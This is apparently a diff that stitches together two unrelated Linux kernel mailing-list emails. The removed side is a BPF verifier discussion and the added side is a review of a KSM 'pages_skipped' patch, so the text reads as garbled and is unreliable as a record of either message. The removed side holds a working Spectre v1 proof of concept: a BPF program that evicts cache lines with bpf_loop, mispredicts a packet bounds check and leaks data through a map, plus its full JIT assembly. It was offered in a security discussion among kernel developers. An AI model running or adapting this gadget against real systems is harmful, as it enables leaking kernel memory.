@@ -2,302 +2,150 @@ Return-Path: <linux-kernel-owner@vger.kernel.org>
 X-Original-To: lists+linux-kernel@lfdr.de
 Delivered-To: lists+linux-kernel@lfdr.de
 Received: from out1.vger.email (out1.vger.email [IPv6:2620:137:e000::1:20])
-	by mail.lfdr.de (Postfix) with ESMTP id 114607A486D
-	for <lists+linux-kernel@lfdr.de>; Mon, 18 Sep 2023 13:30:40 +0200 (CEST)
+	by mail.lfdr.de (Postfix) with ESMTP id 782987A486F
+	for <lists+linux-kernel@lfdr.de>; Mon, 18 Sep 2023 13:31:37 +0200 (CEST)
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-        id S241512AbjIRLaO (ORCPT <rfc822;lists+linux-kernel@lfdr.de>);
-        Mon, 18 Sep 2023 07:30:14 -0400
-Received: from lindbergh.monkeyblade.net ([23.128.96.19]:49002 "EHLO
+        id S241568AbjIRLar (ORCPT <rfc822;lists+linux-kernel@lfdr.de>);
+        Mon, 18 Sep 2023 07:30:47 -0400
+Received: from lindbergh.monkeyblade.net ([23.128.96.19]:58238 "EHLO
         lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S241243AbjIRL3k (ORCPT
+        with ESMTP id S241762AbjIRLak (ORCPT
         <rfc822;linux-kernel@vger.kernel.org>);
-        Mon, 18 Sep 2023 07:29:40 -0400
-Received: from smtp-fw-52005.amazon.com (smtp-fw-52005.amazon.com [52.119.213.156])
-        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id 6896CD2;
-        Mon, 18 Sep 2023 04:26:36 -0700 (PDT)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-  d=amazon.de; i=@amazon.de; q=dns/txt; s=amazon201209;
-  t=1695036406; x=1726572406;
-  h=from:to:cc:subject:date:message-id:in-reply-to:
-   references:mime-version:content-transfer-encoding;
-  bh=+R3gVeOO0pGf426iuoC48P59vEh9CxefiN0g0o/engg=;
-  b=a3kgMQPLwz9l/QYzP+u13kwHg7v2Lu31A4HWNBZiWPFLay3NaxqwVg53
-   eUnAI+zVBDkyboHsRmuYuJBoMRpTUjJrximz0k4LsjM2eQ/N2vwq4fGcT
-   FhoCokm83KswJD9vzevjtWFCx46k3npjsj56iJkS+szxTVgVlmYSzIST1
-   U=;
-X-IronPort-AV: E=Sophos;i="6.02,156,1688428800"; 
-   d="scan'208";a="605034221"
-Received: from iad12-co-svc-p1-lb1-vlan3.amazon.com (HELO email-inbound-relay-iad-1a-m6i4x-366646a6.us-east-1.amazon.com) ([10.43.8.6])
-  by smtp-border-fw-52005.iad7.amazon.com with ESMTP/TLS/ECDHE-RSA-AES256-GCM-SHA384; 18 Sep 2023 11:26:32 +0000
-Received: from EX19D017EUA004.ant.amazon.com (iad12-ws-svc-p26-lb9-vlan2.iad.amazon.com [10.40.163.34])
-        by email-inbound-relay-iad-1a-m6i4x-366646a6.us-east-1.amazon.com (Postfix) with ESMTPS id 67D86A3FCA;
-        Mon, 18 Sep 2023 11:26:27 +0000 (UTC)
-Received: from dev-dsk-gerhorst-1c-a6f23d20.eu-west-1.amazon.com
- (10.15.21.113) by EX19D017EUA004.ant.amazon.com (10.252.50.239) with
- Microsoft SMTP Server (version=TLS1_2,
- cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.2.1118.37; Mon, 18 Sep
- 2023 11:26:19 +0000
-From:   Luis Gerhorst <gerhorst@amazon.de>
-To:     <alexei.starovoitov@gmail.com>
-CC:     <andrii@kernel.org>, <ast@kernel.org>, <bpf@vger.kernel.org>,
-        <daniel@iogearbox.net>, <gerhorst@amazon.de>, <gerhorst@cs.fau.de>,
-        <hagarhem@amazon.de>, <haoluo@google.com>, <iii@linux.ibm.com>,
-        <john.fastabend@gmail.com>, <jolsa@kernel.org>,
-        <kpsingh@kernel.org>, <laoar.shao@gmail.com>,
-        <linux-kernel@vger.kernel.org>, <linux-kselftest@vger.kernel.org>,
-        <martin.lau@linux.dev>, <mykolal@fb.com>, <puranjay12@gmail.com>,
-        <sdf@google.com>, <shuah@kernel.org>, <song@kernel.org>,
-        <yonghong.song@linux.dev>
-Subject: Re: [PATCH 2/3] Revert "bpf: Fix issue in verifying allow_ptr_leaks"
-Date:   Mon, 18 Sep 2023 11:25:50 +0000
-Message-ID: <20230918112549.105846-1-gerhorst@amazon.de>
-X-Mailer: git-send-email 2.40.1
-In-Reply-To: <CAADnVQJ4Fg-VQ-tVCEqsKLuozT7y_o8pZ1oM3eBW7u-Z0jOk4A@mail.gmail.com>
-References: <CAADnVQJ4Fg-VQ-tVCEqsKLuozT7y_o8pZ1oM3eBW7u-Z0jOk4A@mail.gmail.com>
+        Mon, 18 Sep 2023 07:30:40 -0400
+Received: from us-smtp-delivery-124.mimecast.com (us-smtp-delivery-124.mimecast.com [170.10.129.124])
+        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id A4AF6194
+        for <linux-kernel@vger.kernel.org>; Mon, 18 Sep 2023 04:28:11 -0700 (PDT)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=redhat.com;
+        s=mimecast20190719; t=1695036490;
+        h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
+         to:to:cc:cc:mime-version:mime-version:content-type:content-type:
+         content-transfer-encoding:content-transfer-encoding:
+         in-reply-to:in-reply-to:references:references;
+        bh=2+1DSm32hMfdhO5ZA8UHhTzFRwLr/647M51OqI3DUYU=;
+        b=ZrnGXrkU8uOtMoMfrOOOEIlARo9uY9oXBlc5suRYFAEATwFbYW1ZIf9GAB+xWw1jveu9Fs
+        KHTvQZ7y6OIW6yJ9a1QSZL1Wkx885uurX5o+T7eoHFI/LgLjEjPtG1BncJ3+R7ndkE9rjM
+        M2V6xji5u0r4YMCq3t1LYME+7DHJ88M=
+Received: from mail-wm1-f69.google.com (mail-wm1-f69.google.com
+ [209.85.128.69]) by relay.mimecast.com with ESMTP with STARTTLS
+ (version=TLSv1.3, cipher=TLS_AES_256_GCM_SHA384) id
+ us-mta-321-zSBg0_xpPd2lPv3O4RFr0Q-1; Mon, 18 Sep 2023 07:28:09 -0400
+X-MC-Unique: zSBg0_xpPd2lPv3O4RFr0Q-1
+Received: by mail-wm1-f69.google.com with SMTP id 5b1f17b1804b1-401b8089339so33742325e9.3
+        for <linux-kernel@vger.kernel.org>; Mon, 18 Sep 2023 04:28:09 -0700 (PDT)
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20230601; t=1695036488; x=1695641288;
+        h=content-transfer-encoding:in-reply-to:organization:from:references
+         :cc:to:content-language:subject:user-agent:mime-version:date
+         :message-id:x-gm-message-state:from:to:cc:subject:date:message-id
+         :reply-to;
+        bh=2+1DSm32hMfdhO5ZA8UHhTzFRwLr/647M51OqI3DUYU=;
+        b=kDCUs6ZghYEPGWrUpG1GuHZyhm12yCdT1PtHjFiV2eANp+ivM/ZzJbXUJ7i1+Zw3rb
+         N4Um37Fldz/ZzGLmE4p6foBZ5DqC4JhY6ekuWu14uwAySZsPn8Qr31lbOZFGZnDdg5N7
+         8UwxbMLVb0/f7cPNGdP7ZBtf8DnSrurtBTX02zwuCwTN2FJOFNiKMtmTYbYGtDooQXMm
+         5Mz1L2LZyzje2odccYuOV9v/X7ujffIc12XkfIPPDRg5LLjmaSGIKduazotQR3pywq8b
+         NCSEIYBN/cZ+c5g1We2qI1i+gcDBTUk0CVH5BxtOd13QclFDetyL4DKy45DL3AC1jTSz
+         rHVg==
+X-Gm-Message-State: AOJu0YyvFzSRBwcXFIb8oKIr5Bj4SnR2dxPsfkMugxmNvRpJI/jidOQ1
+        MK+IK0E/q7BVjUbDsrE3F9dJD8wf9JKkqY81tdxfwzIXvidzrPnIaT3vX6wQf9G3ZGFUG7B0gqc
+        /jx65OPPoIuDyJ2ap4KHFR5bT
+X-Received: by 2002:a05:600c:3781:b0:401:b2c7:349b with SMTP id o1-20020a05600c378100b00401b2c7349bmr6867514wmr.7.1695036488299;
+        Mon, 18 Sep 2023 04:28:08 -0700 (PDT)
+X-Google-Smtp-Source: AGHT+IEGci4qXIDogvyJYt6l9ZtdNOehLAhFlhO9v1v76ai0+FNRoJ7vZlEt4ipeRiOC9RV3VQ3EAA==
+X-Received: by 2002:a05:600c:3781:b0:401:b2c7:349b with SMTP id o1-20020a05600c378100b00401b2c7349bmr6867504wmr.7.1695036487866;
+        Mon, 18 Sep 2023 04:28:07 -0700 (PDT)
+Received: from ?IPV6:2003:cb:c74b:3400:ec51:7a3a:274e:cbee? (p200300cbc74b3400ec517a3a274ecbee.dip0.t-ipconnect.de. [2003:cb:c74b:3400:ec51:7a3a:274e:cbee])
+        by smtp.gmail.com with ESMTPSA id z9-20020adff1c9000000b0031f07d1edbcsm12516298wro.77.2023.09.18.04.28.07
+        (version=TLS1_3 cipher=TLS_AES_128_GCM_SHA256 bits=128/128);
+        Mon, 18 Sep 2023 04:28:07 -0700 (PDT)
+Message-ID: <67c0bbac-aa4a-28ce-5416-e41af794e899@redhat.com>
+Date:   Mon, 18 Sep 2023 13:28:06 +0200
 MIME-Version: 1.0
-X-Originating-IP: [10.15.21.113]
-X-ClientProxiedBy: EX19D035UWA002.ant.amazon.com (10.13.139.60) To
- EX19D017EUA004.ant.amazon.com (10.252.50.239)
-Content-Type: text/plain; charset="us-ascii"
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101
+ Thunderbird/102.13.0
+Subject: Re: [PATCH v1 2/4] mm/ksm: add pages_skipped metric
+Content-Language: en-US
+To:     Stefan Roesch <shr@devkernel.io>, kernel-team@fb.com
+Cc:     akpm@linux-foundation.org, hannes@cmpxchg.org, riel@surriel.com,
+        linux-kernel@vger.kernel.org, linux-mm@kvack.org
+References: <20230912175228.952039-1-shr@devkernel.io>
+ <20230912175228.952039-3-shr@devkernel.io>
+From:   David Hildenbrand <david@redhat.com>
+Organization: Red Hat
+In-Reply-To: <20230912175228.952039-3-shr@devkernel.io>
+Content-Type: text/plain; charset=UTF-8; format=flowed
 Content-Transfer-Encoding: 7bit
-X-Spam-Status: No, score=0.4 required=5.0 tests=BAYES_00,DKIMWL_WL_HIGH,
-        DKIM_SIGNED,DKIM_VALID,DKIM_VALID_AU,DKIM_VALID_EF,
-        RCVD_IN_DNSWL_BLOCKED,RCVD_IN_MSPIKE_H5,RCVD_IN_MSPIKE_WL,
-        SORTED_RECIPS,SPF_HELO_NONE,T_SPF_PERMERROR autolearn=no
-        autolearn_force=no version=3.4.6
+X-Spam-Status: No, score=-3.6 required=5.0 tests=BAYES_00,DKIMWL_WL_HIGH,
+        DKIM_SIGNED,DKIM_VALID,DKIM_VALID_AU,DKIM_VALID_EF,NICE_REPLY_A,
+        RCVD_IN_DNSWL_BLOCKED,RCVD_IN_MSPIKE_H4,RCVD_IN_MSPIKE_WL,
+        SPF_HELO_NONE,SPF_NONE autolearn=ham autolearn_force=no version=3.4.6
 X-Spam-Checker-Version: SpamAssassin 3.4.6 (2021-04-09) on
         lindbergh.monkeyblade.net
 Precedence: bulk
 List-ID: <linux-kernel.vger.kernel.org>
 X-Mailing-List: linux-kernel@vger.kernel.org
 
-On Thu, 14 Sep 2023 12:47:16 -0700, Alexei Starovoitov wrote:
-> You mean since skb_shared_info is placed after skb->end
-> and in zero copy case destructor_arg may be initialized with the same
-> kernel pointer for multiple skb-s ?
-> The attacker cannot construct the address from data_end.
-> The verifier explicitly prohibits any ALU with PTR_TO_PACKET_END.
-> But the attacker can do skb->data + X.
-> The idea is that they can train the branch to mispredict with
-> a large packet and then send a small one so that shared_info
-> after skb->end has the same uarg pointer in all packets?
-> So every skb->data+X is a different location, but all of them
-> point to data that has uarg==destructor_arg ?
->
-> That would be feasible in theory, but in order to speculate the loads
-> the branch mispredict has to be reliable.
-> The spec v1 attack requires one of two loads feeding
-> into compare operation has to be slow.
-> In this case both data and data_end loads are going to be fast.
-> The attacker cannot evict skb->data or skb->data_end from cache.
+On 12.09.23 19:52, Stefan Roesch wrote:
+> This change adds the "pages skipped" metric. To be able to evaluate how
+> successful smart page scanning is, the pages skipped metric can be
+> compared to the pages scanned metric.
+> 
+> The pages skipped metric is a cumulative counter. The counter is stored
+> under /sys/kernel/mm/ksm/pages_skipped.
+> 
+> Signed-off-by: Stefan Roesch <shr@devkernel.io>
+> ---
+>   mm/ksm.c | 12 ++++++++++++
+>   1 file changed, 12 insertions(+)
+> 
+> diff --git a/mm/ksm.c b/mm/ksm.c
+> index bfd5087c7d5a..728574a3033e 100644
+> --- a/mm/ksm.c
+> +++ b/mm/ksm.c
+> @@ -293,6 +293,9 @@ static bool ksm_smart_scan;
+>   /* The number of zero pages which is placed by KSM */
+>   unsigned long ksm_zero_pages;
+>   
+> +/* The number of pages that have been skipped due to "smart scanning" */
+> +static unsigned long ksm_pages_skipped;
+> +
+>   #ifdef CONFIG_NUMA
+>   /* Zeroed when merging across nodes is not allowed */
+>   static unsigned int ksm_merge_across_nodes = 1;
+> @@ -2345,6 +2348,7 @@ static bool skip_rmap_item(struct page *page, struct ksm_rmap_item *rmap_item)
+>   		return false;
+>   	}
+>   
+> +	ksm_pages_skipped++;
+>   	if (rmap_item->skip_age == 0) {
+>   		rmap_item->skip_age = age + inc_skip_age(age);
+>   		remove_rmap_item_from_tree(rmap_item);
+> @@ -3435,6 +3439,13 @@ static ssize_t pages_volatile_show(struct kobject *kobj,
+>   }
+>   KSM_ATTR_RO(pages_volatile);
+>   
+> +static ssize_t pages_skipped_show(struct kobject *kobj,
+> +				  struct kobj_attribute *attr, char *buf)
+> +{
+> +	return sysfs_emit(buf, "%lu\n", ksm_pages_skipped);
+> +}
+> +KSM_ATTR_RO(pages_skipped);
+> +
+>   static ssize_t ksm_zero_pages_show(struct kobject *kobj,
+>   				struct kobj_attribute *attr, char *buf)
+>   {
+> @@ -3532,6 +3543,7 @@ static struct attribute *ksm_attrs[] = {
+>   	&pages_sharing_attr.attr,
+>   	&pages_unshared_attr.attr,
+>   	&pages_volatile_attr.attr,
+> +	&pages_skipped_attr.attr,
+>   	&ksm_zero_pages_attr.attr,
+>   	&full_scans_attr.attr,
+>   #ifdef CONFIG_NUMA
 
-It is true that this is not easily possible using the method most exploits use,
-at least to my knowledge (i.e., accessing the same address from another core).
-However, it is still possible to evict the cacheline with skb->data/data_end
-from the cache in between the loads by iterating over a large map using
-bpf_loop(). Then the load of skb->data_end would be slow while skb->data is
-readily available in a callee-saved register.
-
-For a CPU with 64KiB of per-core L1 cache all 64-byte cachelines can be evicted
-by iterating over a 64KiB array using 64-byte increments, that's only 1k
-iterations. Meanwhile, skb->data can be safe in r15 as this is not used by
-bpf_loop() and bpf_map_lookup_elem(). Even evicting the L2 cache might be
-possible as bpf_loop() currently has a iteration limit of 8 million. To extend
-that, userspace could work on evicting the L3 cache from other cores and make
-the speculation window even larger. This would of course slow the whole reading
-process down, but in return you can also leak more data by indexing into the
-leak-array using a full byte.
-
-For reference, here's the full program and assembly it is jited to:
-
-static long callback_fn(__u32 index, void *ctx) {
-	__u32 key = index * 8;
-	__u64 *value = bpf_map_lookup_elem(&evictmap, &key);
-	if (value) {
-		*value = 2 * *value;
-		return 0;
-	}
-	return 1;
-}
-
-SEC("tcx/ingress")
-__naked void pkt_ptr(void)
-{
-	// +76: data
-	// +80: data_end
-	asm volatile (" \
-r6 = 0; \
-r7 = r1; \
-prepare_data_%=: \
-r8 = *(u32 *)(r1 + 76); \
-r9 = r8; \
-r9 += 34; \
-evict_loop_%=: \
-w1 = 1024;		\
-r2 = %[callback_fn] ll; \
-r3 = 0; \
-*(u64 *)(r10 - 8) = r3; \
-r3 = r10; \
-r3 += -8; \
-r4 = 0; \
-call %[bpf_loop]; \
-gadget_%=: \
-r2 = *(u32 *)(r7 + 80);	  \
-if r2 <= r9 goto exit_%=; \
-r5 = *(u8 *)(r7 + 14); \
-*(u64*)(r10 - 8) = r5; \
-r2 = r10; \
-r2 += -8; \
-r1 = %[leakmap] ll; \
-call %[bpf_map_lookup_elem]; \
-if r0 == 0 goto exit_%=; \
-r6 = *(u64 *)(r0 + 0); \
-exit_%=: r0 = r6; \
-exit; \
-"	:
-    : __imm_addr(leakmap),
-	  __imm_addr(callback_fn),
-	  __imm(bpf_loop),
-	  __imm(bpf_map_lookup_elem)
-	: __clobber_all);
-}
-
-bpf_prog_64fe264baec539aa_pkt_ptr:
-; asm volatile (" \
-   0:   endbr64
-   4:   nopl   0x0(%rax,%rax,1)
-   9:   xchg   %ax,%ax
-   b:   push   %rbp
-   c:   mov    %rsp,%rbp
-   f:   endbr64
-  13:   sub    $0x20,%rsp
-  1a:   push   %rbx
-  1b:   push   %r13
-  1d:   push   %r14
-  1f:   push   %r15
-  21:   xor    %ebx,%ebx
-  23:   mov    %rdi,%r13
-  26:   mov    0xc8(%rdi),%r14
-  2d:   mov    %r14,%r15
-  30:   add    $0x22,%r15 // data prepared
-  34:   mov    $0x2000,%edi
-  39:   movabs $0xffffffffc01d09b0,%rsi
-  43:   xor    %edx,%edx
-  45:   mov    %rdx,-0x8(%rbp)
-  49:   lfence
-  4c:   mov    %rbp,%rdx
-  4f:   add    $0xfffffffffffffff8,%rdx
-  53:   xor    %ecx,%ecx
-  55:   cmp    $0x800000,%rdi
-  5c:   jbe    0x0000000000000065
-  5e:   mov    $0xfffffff9,%eax
-  63:   jmp    0x00000000000000a2
-  65:   mov    %rbx,-0x20(%rbp)
-  69:   mov    %r13,-0x18(%rbp)
-  6d:   mov    %r14,-0x10(%rbp)
-  71:   mov    %rdi,%rbx
-  74:   xor    %r13d,%r13d
-  77:   mov    %rdx,%r14
-  7a:   cmp    %rbx,%r13
-  7d:   jae    0x0000000000000093
-  7f:   mov    %r13,%rdi
-  82:   mov    %r14,%rsi
-  85:   callq  0x0000000000000148
-  8a:   add    $0x1,%r13
-  8e:   test   %rax,%rax
-  91:   je     0x000000000000007a
-  93:   mov    %r13,%rax
-  96:   mov    -0x20(%rbp),%rbx
-  9a:   mov    -0x18(%rbp),%r13
-  9e:   mov    -0x10(%rbp),%r14
-  a2:   mov    0x50(%r13),%rsi // load data_end
-  a6:   cmp    %r15,%rsi // use of data_end and data
-  a9:   jbe    0x00000000000000f7 // to mispredict
-  ab:   movzwq 0x7c(%r13),%r8 // use of data
-  b0:   shr    $0x10,%r8d
-  b4:   and    $0xff,%r8d
-  bb:   mov    %r8,-0x8(%rbp)
-  bf:   mov    %rbp,%rsi
-  c2:   add    $0xfffffffffffffff8,%rsi
-  c6:   movabs $0xffffb85680acd000,%rdi
-  d0:   add    $0x210,%rdi
-  d7:   mov    0x0(%rsi),%eax
-  da:   cmp    $0x20000,%rax
-  e1:   jae    0x00000000000000ec
-  e3:   shl    $0x3,%rax
-  e7:   add    %rdi,%rax
-  ea:   jmp    0x00000000000000ee
-  ec:   xor    %eax,%eax
-  ee:   test   %rax,%rax
-  f1:   je     0x00000000000000f7
-  f3:   mov    0x0(%rax),%rbx
-  f7:   mov    %rbx,%rax
-  fa:   pop    %r15
-  fc:   pop    %r14
-  fe:   pop    %r13
- 100:   pop    %rbx
- 101:   leaveq
- 102:   retq
-
-long callback_fn(__u32 index, void * ctx):
-bpf_prog_8e1ec5bf965fdd4a_callback_fn:
-; __u32 key = index * 8;
-   0:   endbr64
-   4:   nopl   0x0(%rax,%rax,1)
-   9:   xchg   %ax,%ax
-   b:   push   %rbp
-   c:   mov    %rsp,%rbp
-   f:   endbr64
-  13:   sub    $0x8,%rsp
-  1a:   shl    $0x3,%edi
-; __u32 key = index * 8;
-  1d:   mov    %edi,-0x4(%rbp)
-  20:   lfence
-  23:   mov    %rbp,%rsi
-;
-  26:   add    $0xfffffffffffffffc,%rsi
-; __u64 *value = bpf_map_lookup_elem(&evictmap, &key);
-  2a:   movabs $0xffffb85680a01000,%rdi
-  34:   add    $0x210,%rdi
-  3b:   mov    0x0(%rsi),%eax
-  3e:   cmp    $0x1000,%rax
-  45:   jae    0x0000000000000050
-  47:   shl    $0x3,%rax
-  4b:   add    %rdi,%rax
-  4e:   jmp    0x0000000000000052
-  50:   xor    %eax,%eax
-  52:   mov    $0x1,%edi
-; if (value) {
-  57:   test   %rax,%rax
-  5a:   je     0x0000000000000069
-; *value = 2 * *value;
-  5c:   mov    0x0(%rax),%rdi
-; *value = 2 * *value;
-  60:   shl    %rdi
-; *value = 2 * *value;
-  63:   mov    %rdi,0x0(%rax)
-  67:   xor    %edi,%edi
-; }
-  69:   mov    %rdi,%rax
-  6c:   leaveq
-  6d:   retq
-
-> Remember that we rearranged 'max_entries' field in struct bpf_map
-> specifically to be in the different cache line vs fields
-> controlled by user space. It was the necessary part of spec v1 attack.
+Reviewed-by: David Hildenbrand <david@redhat.com>
 
 -- 
-Luis
+Cheers,
 
-
-
-Amazon Development Center Germany GmbH
-Krausenstr. 38
-10117 Berlin
-Geschaeftsfuehrung: Christian Schlaeger, Jonathan Weiss
-Eingetragen am Amtsgericht Charlottenburg unter HRB 149173 B
-Sitz: Berlin
-Ust-ID: DE 289 237 879
-
-
+David / dhildenb
 
